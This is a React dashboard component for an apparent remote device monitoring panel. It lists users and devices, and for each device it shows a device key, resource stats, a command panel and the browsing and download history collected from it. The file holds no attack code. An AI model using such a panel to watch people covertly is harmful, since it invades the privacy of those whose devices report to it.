import { useEffect, useMemo, useState } from "react";
import clsx from "clsx";
import DeviceCard from "../components/DeviceCard.jsx";
import CommandPanel from "../components/CommandPanel.jsx";
import { clearDeviceHistory, fetchAdminUsers } from "../services/api";
import { useDevices } from "../state/useDevices.js";

export default function Dashboard() {
  const { devices, selected, select, load, remove } = useDevices();
  const active = devices.find((d) => d.id === selected) || devices[0];
  const [historyView, setHistoryView] = useState("browser");
  const [historyStatus, setHistoryStatus] = useState("");
  const [users, setUsers] = useState([]);

  const browsingHistory = useMemo(
    () => (active?.logs || []).filter((log) => log.type === "browser"),
    [active?.logs]
  );

  const downloadHistory = useMemo(
    () => (active?.logs || []).filter((log) => log.type === "download"),
    [active?.logs]
  );

  const historyItems = historyView === "browser" ? browsingHistory : downloadHistory;

  useEffect(() => {
    const loadAll = async () => {
      await load();
      try {
        const list = await fetchAdminUsers();
        setUsers(list);
      } catch {
        setUsers([]);
      }
    };
    loadAll();
  }, [load]);

  const handleClearHistory = async () => {
    if (!active) return;
    const label = historyView === "browser" ? "browsing" : "download";
    const confirmed = window.confirm(`Clear ${label} history for this device?`);
    if (!confirmed) return;
    setHistoryStatus("Clearing...");
    try {
      await clearDeviceHistory(active.id, historyView);
      await load();
      setHistoryStatus("History cleared");
    } catch {
      setHistoryStatus("Failed to clear history");
    }
    setTimeout(() => setHistoryStatus(""), 1500);
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-[320px_1fr] gap-4 p-6">
      <aside className="space-y-3">
        <div className="p-3 rounded-xl border border-slate-800 bg-card">
          <h2 className="text-slate-300 text-sm mb-2">Users</h2>
          <div className="space-y-2 max-h-40 overflow-auto">
            {users.map((u) => (
              <div key={u.id} className="text-xs bg-slate-800/70 border border-slate-700 rounded-lg p-2">
                <p className="text-white font-medium">{u.nickname}</p>
                <p className="text-slate-400">{u.email}</p>
              </div>
            ))}
            {users.length === 0 && <p className="text-slate-500 text-xs">No users yet</p>}
          </div>
        </div>
        <h2 className="text-slate-300 text-sm">Devices</h2>
        <div className="space-y-2">
          {devices.map((d) => (
            <DeviceCard key={d.id} device={d} onSelect={() => select(d.id)} isActive={active?.id === d.id} />
          ))}
          {devices.length === 0 && <p className="text-slate-500 text-sm">Waiting for devices...</p>}
        </div>
      </aside>
      <main className="space-y-4">
        {active ? (
          <div className="space-y-4">
            <div className="p-4 rounded-xl border border-slate-800 bg-card">
              <div className="flex items-center justify-between mb-2">
                <div>
                  <p className="text-lg text-white font-semibold">{active.nickname || active.name}</p>
                  <p className="text-xs text-slate-400">{active.email || "No email"}</p>
                  <p className="text-xs text-slate-500">{active.id}</p>
                </div>
                <div className="flex items-center gap-2">
                  {active.blocked && <span className="text-[10px] px-2 py-1 rounded-full bg-red-500/20 text-red-200">blocked</span>}
                  <span className="text-xs px-2 py-1 rounded-full bg-emerald-500/20 text-emerald-200">{active.status}</span>
                </div>
              </div>
              <p className="text-xs text-slate-400">device_key: {active.deviceKey || "--"}</p>
              <p className="text-xs text-slate-400">last_active: {active.lastActive || active.lastSeen || "--"}</p>
              <p className="text-sm text-slate-300">CPU {active.stats?.cpu ?? 0}% • RAM {active.stats?.ram ?? 0}%</p>
            </div>
            <CommandPanel device={active} onDeleted={(id) => remove(id)} />
            <div className="p-4 rounded-xl border border-slate-800 bg-card">
              <div className="flex items-center justify-between gap-2 mb-3">
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => setHistoryView("browser")}
                    className={clsx(
                      "px-3 py-1.5 rounded-lg text-xs border",
                      historyView === "browser"
                        ? "bg-accent/20 text-accent border-accent/50"
                        : "bg-slate-800 text-slate-300 border-slate-700"
                    )}
                  >
                    Browsing History
                  </button>
                  <button
                    onClick={() => setHistoryView("download")}
                    className={clsx(
                      "px-3 py-1.5 rounded-lg text-xs border",
                      historyView === "download"
                        ? "bg-accent/20 text-accent border-accent/50"
                        : "bg-slate-800 text-slate-300 border-slate-700"
                    )}
                  >
                    Download History
                  </button>
                </div>
                <button
                  onClick={handleClearHistory}
                  className="px-3 py-1.5 rounded-lg text-xs border border-red-400/40 bg-red-500/20 text-red-200"
                >
                  Clear History
                </button>
              </div>

              {historyStatus && <p className="text-xs text-slate-300 mb-2">{historyStatus}</p>}

              <div className="space-y-2 max-h-56 overflow-auto">
                {historyItems.map((log) => (
                  <div key={log.id} className="text-xs text-slate-200 bg-slate-800/60 p-2 rounded-lg">
                    <span className="text-slate-500 mr-2">{log.ts?.slice(11, 19)}</span>
                    {log.url || log.message}
                  </div>
                ))}
                {historyItems.length === 0 && (
                  <p className="text-slate-500 text-sm">
                    {historyView === "browser" ? "No browsing history yet." : "No download history yet."}
                  </p>
                )}
              </div>
            </div>
            <div className="p-4 rounded-xl border border-slate-800 bg-card">
              <p className="text-sm text-slate-400 mb-2">Recent Logs</p>
              <div className="space-y-2 max-h-64 overflow-auto">
                {(active.logs || []).map((log) => (
                  <div key={log.id} className="text-xs text-slate-200 bg-slate-800/60 p-2 rounded-lg">
                    <span className="text-slate-500 mr-2">{log.ts?.slice(11, 19)}</span>
                    {log.message || log.url || JSON.stringify(log)}
                  </div>
                ))}
                {(active.logs || []).length === 0 && <p className="text-slate-500 text-sm">No logs yet.</p>}
              </div>
            </div>
          </div>
        ) : (
          <div className="p-6 rounded-xl border border-dashed border-slate-700 text-slate-500">Select a device</div>
        )}
      </main>
    </div>
  );
}
